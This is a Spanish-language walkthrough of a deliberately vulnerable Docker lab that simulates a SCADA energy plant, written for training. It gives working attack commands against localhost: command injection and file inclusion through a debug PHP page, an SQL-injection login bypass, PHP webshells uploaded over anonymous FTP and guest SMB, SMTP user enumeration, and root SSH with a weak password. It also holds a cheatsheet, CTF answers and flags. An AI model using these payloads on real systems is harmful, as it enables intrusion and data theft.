<div align="center">

# ⚡ Planta Energía Vulnerable Lab
### Writeup Técnico — Intrusión Controlada

![Status](https://img.shields.io/badge/Status-Active-ff3c6e?style=for-the-badge&logo=statuspage&logoColor=white)
![Level](https://img.shields.io/badge/Nivel-Intermedio-ffb300?style=for-the-badge&logo=hackthebox&logoColor=white)
![Theme](https://img.shields.io/badge/Temática-ICS%20%2F%20SCADA-a855f7?style=for-the-badge&logo=linux&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Docker-00d4ff?style=for-the-badge&logo=docker&logoColor=white)

</div>

---

> **Escenario:** Infraestructura SCADA simulada con servicios heredados deliberadamente inseguros. Enfocado en exposición de credenciales, ejecución remota de código y pivote entre superficies **FTP, SMB, Web, SSH, TELNET y SMTP**.

> [!WARNING]
> **Aviso Legal:** Uso exclusivo en laboratorio local y red aislada. No exponer este entorno a Internet. Todas las debilidades son intencionales con fines didácticos.

---

## 📑 Tabla de Contenidos

| # | Sección |
|---|---------|
| 01 | [📋 Ficha Técnica](#-ficha-técnica) |
| 02 | [🚀 Despliegue del Lab](#-despliegue-del-lab) |
| 03 | [🗺️ Mapa de Superficie de Ataque](#️-mapa-de-superficie-de-ataque) |
| 04 | [🔭 Enumeración Inicial](#-enumeración-inicial) |
| 05 | [🌐 Vector Web](#-vector-web) |
| 06 | [🔑 Exposición de Credenciales](#-exposición-de-credenciales) |
| 07 | [💉 SQL Injection](#-sql-injection) |
| 08 | [📁 Vector FTP](#-vector-ftp) |
| 09 | [🖧 Vector SMB](#-vector-smb) |
| 10 | [📧 Vector SMTP](#-vector-smtp) |
| 11 | [🔐 Acceso Remoto — SSH & TELNET](#-acceso-remoto--ssh--telnet) |
| 12 | [⛓️ Cadenas de Explotación](#️-cadenas-de-explotación) |
| 13 | [🚩 Tabla de Flags](#-tabla-de-flags) |
| 14 | [🔍 Hallazgos Técnicos](#-hallazgos-técnicos) |
| 15 | [⚡ Cheatsheet de Comandos](#-cheatsheet-de-comandos) |
| 16 | [❓ Preguntas Tipo CTF](#-preguntas-tipo-ctf) |

---

## 📋 Ficha Técnica

| Campo | Valor |
|-------|-------|
| 🏷️ Nombre | `Planta Energía Vulnerable Lab` |
| 🖥️ Hostname interno | `ENERGIA-SCADA01` |
| 🐳 Servicio Docker | `planta-energia-vulnerable` |
| 🌐 IP interna | `172.25.0.10` |
| 🔌 Puertos expuestos | `21`, `2222`, `2323`, `2525`, `8080`, `1139`, `1445`, `2100-2130` |
| 🎯 Nivel | Intermedio |
| 📡 Temática | ICS / SCADA / Servicios Legacy |

---

## 🚀 Despliegue del Lab

**Levantar el entorno:**

```bash
cd /home/f4b55/Contenedores/planta-energia-vulnerable
docker compose up -d --build
docker logs -f planta-energia-vulnerable
```

**Apagar el entorno:**

```bash
docker compose down
```

---

## 🗺️ Mapa de Superficie de Ataque

| Vector | 🔴 Debilidad | 💥 Impacto |
|--------|-------------|-----------|
| 🌐 **Web** | `robots.txt`, backups, `.env`, config expuesta | Fuga de credenciales y rutas |
| 🌐 **Web** | `test/test.php?cmd=` | **RCE** directo |
| 🌐 **Web** | `test/test.php?file=` | **LFI** — lectura arbitraria |
| 🌐 **Web** | `/admin/` login form | **SQL Injection** |
| 📁 **FTP** | Acceso anónimo + upload + sincronización automática | Webshell vía FTP |
| 🖧 **SMB** | Guest write en share `Public` | Webshell directa |
| 📧 **SMTP** | `VRFY`, `EXPN`, open relay | Enumeración de cuentas |
| 🔐 **SSH** | `PermitRootLogin yes` + passwords débiles | Shell remota como root |
| 📺 **TELNET** | Credenciales en claro | Shell remota legacy |

---

## 🔭 Enumeración Inicial

![Tool](https://img.shields.io/badge/Tool-Nmap-ff3c6e?style=flat-square&logo=linux&logoColor=white)

### `[01]` Escaneo de Puertos y Servicios

```bash
nmap -sC -sV -Pn -p21,2222,2323,2525,8080,1139,1445 127.0.0.1
```

**Hallazgos esperados:**

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| `21/tcp` | FTP | `vsftpd 3.0.3`, banner industrial |
| `2222/tcp` | SSH | Autenticación por password habilitada |
| `2323/tcp` | TELNET | Acceso en texto claro |
| `2525/tcp` | SMTP | `VRFY` y `EXPN` habilitados |
| `8080/tcp` | HTTP | Apache + PHP con directory listing |
| `1139/tcp` | SMB | Guest/null session, SMB legado |
| `1445/tcp` | SMB | Guest/null session, SMB legado |

### `[02]` Fingerprint Rápido

```bash
curl -i http://127.0.0.1:8080/
curl -i http://127.0.0.1:8080/robots.txt
printf 'EHLO test\r\nQUIT\r\n' | nc 127.0.0.1 2525
```

---

## 🌐 Vector Web

![Tool](https://img.shields.io/badge/Tool-curl%20%7C%20ffuf%20%7C%20gobuster-00d4ff?style=flat-square)

### `[01]` Reconocimiento Web — robots.txt

```bash
curl http://127.0.0.1:8080/robots.txt
```

**Contenido revelado:**

```text
Disallow: /secret/
Disallow: /backup/
Disallow: /test/
Disallow: /admin/
```

**Rutas de interés descubiertas:**

- `/secret/web.txt` — 🚩 Flag
- `/backup/` — Directory listing con backups
- `/test/test.php` — Panel de debug vulnerable
- `/admin/` — Panel SCADA con SQLi
- `/.env` — Variables de entorno expuestas
- `/includes/config.php` — Credenciales BD en claro
- `/phpinfo.php` — Info del servidor

### `[02]` Enumeración de Directorios

```bash
# FFUF
ffuf -u http://127.0.0.1:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Gobuster
gobuster dir -u http://127.0.0.1:8080 -w /usr/share/wordlists/dirb/common.txt
```

### `[03]` RCE — Panel de Debug

> [!IMPORTANT]
> El parámetro `cmd` se pasa directamente a `system()` **sin ninguna validación.**

```bash
# Prueba básica
curl "http://127.0.0.1:8080/test/test.php?cmd=id"

# Lectura de flag
curl "http://127.0.0.1:8080/test/test.php?cmd=cat%20/flag_web.txt"
```

🚩 **Flag:** `PLE{web_debug_rce_lfi_backup_exp0s3d}`

### `[04]` LFI — Local File Inclusion

```bash
# Lectura de /etc/passwd
curl "http://127.0.0.1:8080/test/test.php?file=/etc/passwd"

# Lectura de secretos
curl "http://127.0.0.1:8080/test/test.php?file=/var/www/html/.env"
```

**Impacto:** lectura arbitraria de archivos, recuperación de secretos, apoyo a escalada y pivote.

### `[05]` Flag — Directorio Secreto

```bash
curl http://127.0.0.1:8080/secret/web.txt
```

🚩 **Flag:** `PLE{web_robots_secret_d1r_f0und}`

### `[06]` Flag — Directory Listing y Backups

```bash
curl http://127.0.0.1:8080/backup/
curl http://127.0.0.1:8080/backup/web-backup.txt
```

🚩 **Flag:** `PLE{web_backup_listing_m1sc0nf1g}`

---

## 🔑 Exposición de Credenciales

![Risk](https://img.shields.io/badge/Severidad-Crítica-ff3c6e?style=flat-square)

**Archivos accesibles sin autenticación:**

```bash
curl http://127.0.0.1:8080/.env
curl http://127.0.0.1:8080/includes/config.php
curl http://127.0.0.1:8080/backup/config.bak
curl http://127.0.0.1:8080/backup/usuarios.txt
```

**Credenciales recuperadas:**

```text
root         : toor
admin        : admin123
operador     : energia123
scada        : scada
respaldo     : backup
ftpuser      : ftp123
energia_user : Energia2024!
```

> [!IMPORTANT]
> Estas credenciales habilitan login web, acceso remoto, consultas a la BD y abuso lateral de todos los demás servicios del lab.

---

## 💉 SQL Injection

![Tool](https://img.shields.io/badge/Tool-curl%20%7C%20sqlmap-ffb300?style=flat-square)

**Login vulnerable en:** `http://127.0.0.1:8080/admin/`

La consulta backend usa interpolación directa:

```sql
SELECT * FROM usuarios WHERE username = '$u' AND password = '$p'
```

### `[01]` Payload Manual

```text
username: admin' OR '1'='1' -- -
password: x
```

### `[02]` Explotación con curl

```bash
curl -s -X POST http://127.0.0.1:8080/admin/ \
  -d "username=admin' OR '1'='1' -- -&password=x"
```

### `[03]` Automatización con sqlmap

```bash
sqlmap -u http://127.0.0.1:8080/admin/ \
  --data="username=admin&password=test" \
  -p username --batch --level 3 --risk 2
```

🚩 **Flag:** `PLE{sqli_auth_bypass_scada_panel}`

---

## 📁 Vector FTP

![Tool](https://img.shields.io/badge/Tool-ftp%20%7C%20curl%20%7C%20lftp-00ff88?style=flat-square)

El servicio FTP permite:
- ✅ Acceso anónimo
- ✅ Escritura en `/drop`
- ✅ Sincronización automática de `*.php` → `/var/www/html/uploads/ftp/drop/`

### `[01]` Lectura de Flag FTP

```bash
curl ftp://anonymous:any@127.0.0.1/pub/ftp.txt
```

🚩 **Flag:** `PLE{ftp_4n0nym0us_wr1t3_exp0s3d}`

### `[02]` Webshell vía FTP

```bash
# Crear webshell
printf '%s\n' '<?php system($_GET["cmd"] ?? "id"); ?>' > shell.php

# Subir al FTP
curl -T shell.php "ftp://anonymous:any@127.0.0.1/drop/shell.php"

# Esperar sincronización y ejecutar
sleep 3
curl "http://127.0.0.1:8080/uploads/ftp/drop/shell.php?cmd=id"
```

> [!NOTE]
> `ftp_sync.sh` copia cualquier `*.php` desde `/srv/ftp/drop` hacia el árbol web público automáticamente.

---

## 🖧 Vector SMB

![Tool](https://img.shields.io/badge/Tool-smbclient%20%7C%20enum4linux-ff6b00?style=flat-square)

### `[01]` Listar Shares

```bash
smbclient -N -p 1445 -L //127.0.0.1
```

**Shares expuestos:**

| Share | Acceso | Ruta en servidor |
|-------|--------|-----------------|
| `Public` | ✅ Guest write | `/var/www/html/uploads/smb` |
| `Operaciones` | 🔒 Autenticado | — |
| `Backup` | 👁️ Guest read | Backups del sistema |

### `[02]` Webshell vía SMB

```bash
# Crear y subir webshell
printf '%s\n' '<?php system($_GET["cmd"] ?? "id"); ?>' > smb.php
smbclient -N -p 1445 //127.0.0.1/Public -c "put smb.php smb.php"

# Ejecutar
curl "http://127.0.0.1:8080/uploads/smb/smb.php?cmd=id"
```

### `[03]` Lectura de Share Backup

```bash
smbclient -N -p 1445 //127.0.0.1/Backup -c "recurse; ls"
```

🚩 **Flag:** `PLE{smb_null_s3ss10n_backup_exp0s3d}`

---

## 📧 Vector SMTP

![Tool](https://img.shields.io/badge/Tool-nc%20%7C%20swaks%20%7C%20smtp--user--enum-ffb300?style=flat-square)

### `[01]` Enumeración de Usuarios — VRFY / EXPN

```bash
printf 'EHLO auditor.local\r\nVRFY smtpflag\r\nEXPN staff\r\nQUIT\r\n' | nc 127.0.0.1 2525
```

**Usuarios válidos confirmados:** `admin`, `operador`, `scada`, `respaldo`, `ftpuser`, `root`, `smtpflag`

### `[02]` Prueba con swaks

```bash
swaks --server 127.0.0.1:2525 --ehlo auditor.local --quit-after RCPT
```

**Valor ofensivo:**
- 📋 Enumeración de usuarios para password spraying
- 📬 Validación de superficie interna
- 🔗 Apoyo al movimiento lateral

🚩 **Flag:** `PLE{smtp_vrfy_open_r3l4y_us3r_enum}`

---

## 🔐 Acceso Remoto — SSH & TELNET

### `[01]` SSH — Root por Password Débil

![Tool](https://img.shields.io/badge/Tool-SSH-5865f2?style=flat-square)

```bash
ssh -p 2222 root@127.0.0.1
# password: toor
```

```bash
cat /root/ssh.txt
```

🚩 **Flag:** `PLE{ssh_r00t_l0g1n_w34k_p4ss}`

> [!IMPORTANT]
> Configuración vulnerable: `PermitRootLogin yes` + `PasswordAuthentication yes`

### `[02]` TELNET — Credenciales en Texto Claro

![Tool](https://img.shields.io/badge/Tool-Telnet-ff3c6e?style=flat-square)

```bash
telnet 127.0.0.1 2323
# usuario: operador
# password: energia123
```

```bash
cat /home/operador/telnet.txt
```

🚩 **Flag:** `PLE{telnet_pl41nt3xt_cr3ds_l34k}`

---

## ⛓️ Cadenas de Explotación

### 🛣️ Camino 1 — Web Puro

```
robots.txt  ──►  /backup/ + /.env  ──►  RCE en /test/test.php  ──►  🚩 Flags
```

### 🛣️ Camino 2 — FTP hacia RCE

```
FTP anónimo  ──►  upload shell.php en /drop  ──►  sync automático  ──►  🚩 RCE web
```

### 🛣️ Camino 3 — SMB hacia RCE

```
Null session  ──►  PUT smb.php en Public  ──►  ejecución en /uploads/smb/  ──►  🚩 RCE
```

### 🛣️ Camino 4 — Credenciales hacia Shell

```
backups / .env  ──►  root:toor  ──►  ssh -p 2222 root@127.0.0.1  ──►  🚩 Root shell
```

---

## 🚩 Tabla de Flags

| # | Vector | Ubicación / Técnica | Flag |
|---|--------|---------------------|------|
| 1 | 🌐 Web secreto | `/secret/web.txt` | `PLE{web_robots_secret_d1r_f0und}` |
| 2 | 🌐 Web backup | `/backup/web-backup.txt` | `PLE{web_backup_listing_m1sc0nf1g}` |
| 3 | 💥 Web RCE | `cat /flag_web.txt` | `PLE{web_debug_rce_lfi_backup_exp0s3d}` |
| 4 | 💉 SQLi | Panel `/admin/` | `PLE{sqli_auth_bypass_scada_panel}` |
| 5 | 📁 FTP | `/srv/ftp/pub/ftp.txt` | `PLE{ftp_4n0nym0us_wr1t3_exp0s3d}` |
| 6 | 🖧 SMB | Share `Backup` | `PLE{smb_null_s3ss10n_backup_exp0s3d}` |
| 7 | 📧 SMTP | Mailbox `smtpflag` | `PLE{smtp_vrfy_open_r3l4y_us3r_enum}` |
| 8 | 🔐 SSH | `/root/ssh.txt` | `PLE{ssh_r00t_l0g1n_w34k_p4ss}` |
| 9 | 📺 TELNET | `/home/operador/telnet.txt` | `PLE{telnet_pl41nt3xt_cr3ds_l34k}` |

---

## 🔍 Hallazgos Técnicos

| ID | Hallazgo | Severidad |
|----|----------|-----------|
| `PLE-01` | Credenciales expuestas en `/.env`, backups y archivos públicos | ![](https://img.shields.io/badge/-Crítica-ff3c6e?style=flat-square) |
| `PLE-02` | RCE directa vía `system($_GET['cmd'])` sin validación | ![](https://img.shields.io/badge/-Crítica-ff3c6e?style=flat-square) |
| `PLE-03` | LFI vía `include($_GET['file'])` | ![](https://img.shields.io/badge/-Crítica-ff3c6e?style=flat-square) |
| `PLE-04` | SQL Injection en login admin | ![](https://img.shields.io/badge/-Alta-ff6b00?style=flat-square) |
| `PLE-05` | FTP anónimo con upload y sincronización web | ![](https://img.shields.io/badge/-Alta-ff6b00?style=flat-square) |
| `PLE-06` | SMB guest write y null session | ![](https://img.shields.io/badge/-Alta-ff6b00?style=flat-square) |
| `PLE-07` | SSH root por password — `PermitRootLogin yes` | ![](https://img.shields.io/badge/-Alta-ff6b00?style=flat-square) |
| `PLE-08` | TELNET habilitado — texto claro | ![](https://img.shields.io/badge/-Alta-ff6b00?style=flat-square) |
| `PLE-09` | SMTP con `VRFY` / `EXPN` — enumeración de usuarios | ![](https://img.shields.io/badge/-Media-ffb300?style=flat-square) |
| `PLE-10` | Banners, versiones y directory listing expuestos | ![](https://img.shields.io/badge/-Media-ffb300?style=flat-square) |

---

## ⚡ Cheatsheet de Comandos

```bash
# ── RECON ─────────────────────────────────────────────────────────────
nmap -sC -sV -Pn -p21,2222,2323,2525,8080,1139,1445 127.0.0.1

# ── WEB ───────────────────────────────────────────────────────────────
curl http://127.0.0.1:8080/robots.txt
curl http://127.0.0.1:8080/.env
curl "http://127.0.0.1:8080/test/test.php?cmd=id"
curl "http://127.0.0.1:8080/test/test.php?file=/etc/passwd"
ffuf -u http://127.0.0.1:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt

# ── SQLi ──────────────────────────────────────────────────────────────
curl -s -X POST http://127.0.0.1:8080/admin/ \
  -d "username=admin' OR '1'='1' -- -&password=x"

# ── FTP ───────────────────────────────────────────────────────────────
curl ftp://anonymous:any@127.0.0.1/pub/ftp.txt
curl -T shell.php "ftp://anonymous:any@127.0.0.1/drop/shell.php"
curl "http://127.0.0.1:8080/uploads/ftp/drop/shell.php?cmd=id"

# ── SMB ───────────────────────────────────────────────────────────────
smbclient -N -p 1445 -L //127.0.0.1
smbclient -N -p 1445 //127.0.0.1/Public -c "put smb.php smb.php"
curl "http://127.0.0.1:8080/uploads/smb/smb.php?cmd=id"

# ── SMTP ──────────────────────────────────────────────────────────────
printf 'EHLO a\r\nVRFY smtpflag\r\nEXPN staff\r\nQUIT\r\n' | nc 127.0.0.1 2525

# ── ACCESO REMOTO ─────────────────────────────────────────────────────
ssh -p 2222 root@127.0.0.1          # password: toor
telnet 127.0.0.1 2323               # operador / energia123
```

---

## ❓ Preguntas Tipo CTF

<details>
<summary>🔭 <strong>Reconocimiento</strong></summary>

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuántos puertos TCP expone la máquina al host? | `7` |
| 2 | ¿Qué puerto externo usa el servicio web? | `8080` |
| 3 | ¿Qué puerto externo usa SSH? | `2222` |
| 4 | ¿Qué puerto externo usa TELNET? | `2323` |
| 5 | ¿Qué puerto externo usa SMTP? | `2525` |
| 6 | ¿Qué dos puertos corresponden a SMB? | `1139`, `1445` |
| 7 | ¿Qué software FTP revela el banner? | `vsftpd 3.0.3` |
| 8 | ¿Cuál es el hostname interno del contenedor? | `ENERGIA-SCADA01` |
| 9 | ¿Qué archivo web revela rutas sensibles? | `robots.txt` |
| 10 | ¿Qué directorio oculto en robots.txt contiene una flag? | `/secret/` |

</details>

<details>
<summary>🌐 <strong>Web</strong></summary>

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 11 | ¿Qué archivo expone variables de entorno y credenciales? | `.env` |
| 12 | ¿Qué archivo PHP contiene credenciales de BD en claro? | `includes/config.php` |
| 13 | ¿Qué directorio permite directory listing con backups? | `/backup/` |
| 14 | ¿Qué endpoint ejecuta comandos por parámetro GET? | `/test/test.php?cmd=` |
| 15 | ¿Qué endpoint permite LFI? | `/test/test.php?file=` |
| 16 | ¿Qué panel es vulnerable a SQL Injection? | `/admin/` |
| 17 | ¿Qué técnica permite saltarse el login de `/admin/`? | `SQL Injection` |
| 18 | ¿Cuál es la base de datos del panel SCADA? | `energia_db` |
| 19 | ¿Qué usuario de BD aparece en la configuración? | `energia_user` |
| 20 | ¿Cuál es la contraseña del usuario de BD? | `Energia2024!` |

</details>

<details>
<summary>📁🖧📧 <strong>FTP / SMB / SMTP</strong></summary>

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 21 | ¿Qué protocolo permite acceso anónimo y subida de archivos? | `FTP` |
| 22 | ¿En qué directorio FTP se suben archivos que terminan expuestos en la web? | `/drop/` |
| 23 | ¿Qué script sincroniza `*.php` del FTP hacia la ruta web? | `ftp_sync.sh` |
| 24 | ¿Qué share SMB permite subida anónima? | `Public` |
| 25 | ¿Qué share SMB expone backups en modo lectura? | `Backup` |
| 26 | ¿Qué comandos SMTP permiten enumerar usuarios? | `VRFY` y `EXPN` |
| 27 | ¿Qué cuenta SMTP está asociada a una flag? | `smtpflag` |

</details>

<details>
<summary>🔐 <strong>Acceso Remoto</strong></summary>

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 28 | ¿Qué servicio permite login remoto como `root` con password débil? | `SSH` |
| 29 | ¿Cuál es la contraseña de `root`? | `toor` |
| 30 | ¿Qué usuario de TELNET tiene contraseña `energia123`? | `operador` |
| 31 | ¿Qué servicio legacy transmite credenciales en texto claro? | `TELNET` |

</details>

<details>
<summary>🚩 <strong>Flags</strong></summary>

| # | Pregunta | Flag |
|---|----------|------|
| 32 | Flag del directorio secreto web | `PLE{web_robots_secret_d1r_f0und}` |
| 33 | Flag del backup web expuesto | `PLE{web_backup_listing_m1sc0nf1g}` |
| 34 | Flag vía RCE en panel debug | `PLE{web_debug_rce_lfi_backup_exp0s3d}` |
| 35 | Flag del panel SCADA comprometido por SQLi | `PLE{sqli_auth_bypass_scada_panel}` |
| 36 | Flag publicada en FTP | `PLE{ftp_4n0nym0us_wr1t3_exp0s3d}` |
| 37 | Flag en share SMB de backups | `PLE{smb_null_s3ss10n_backup_exp0s3d}` |
| 38 | Flag de enumeración SMTP | `PLE{smtp_vrfy_open_r3l4y_us3r_enum}` |
| 39 | Flag del acceso SSH con root | `PLE{ssh_r00t_l0g1n_w34k_p4ss}` |
| 40 | Flag del acceso TELNET | `PLE{telnet_pl41nt3xt_cr3ds_l34k}` |

</details>

<details>
<summary>🧠 <strong>Extra</strong></summary>

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 41 | ¿Qué vulnerabilidad permite leer archivos arbitrarios via `include()`? | `LFI` |
| 42 | ¿Qué vulnerabilidad permite ejecutar shell commands desde parámetro GET? | `RCE` |
| 43 | ¿Qué dos servicios permiten lograr webshell por subida de archivos? | `FTP` y `SMB` |
| 44 | ¿Qué archivo FTP contiene credenciales temporales del sistema? | `credenciales_sistemas.txt` |
| 45 | ¿Qué usuario de aplicación reutiliza su nombre como contraseña? | `scada` |

</details>

---

<div align="center">

**`Planta Energía Vulnerable Lab`** concentra múltiples clases de fallos reales en una sola cadena ofensiva coherente: fuga de secretos, servicios heredados, ejecución remota, credenciales débiles y compartición insegura entre servicios.

![](https://img.shields.io/badge/FTP-Webshell-00ff88?style=flat-square)
![](https://img.shields.io/badge/SMB-Null%20Session-ff6b00?style=flat-square)
![](https://img.shields.io/badge/Web-RCE%20%7C%20LFI%20%7C%20SQLi-ff3c6e?style=flat-square)
![](https://img.shields.io/badge/SSH-Root%20Shell-a855f7?style=flat-square)
![](https://img.shields.io/badge/SMTP-User%20Enum-ffb300?style=flat-square)

</div>
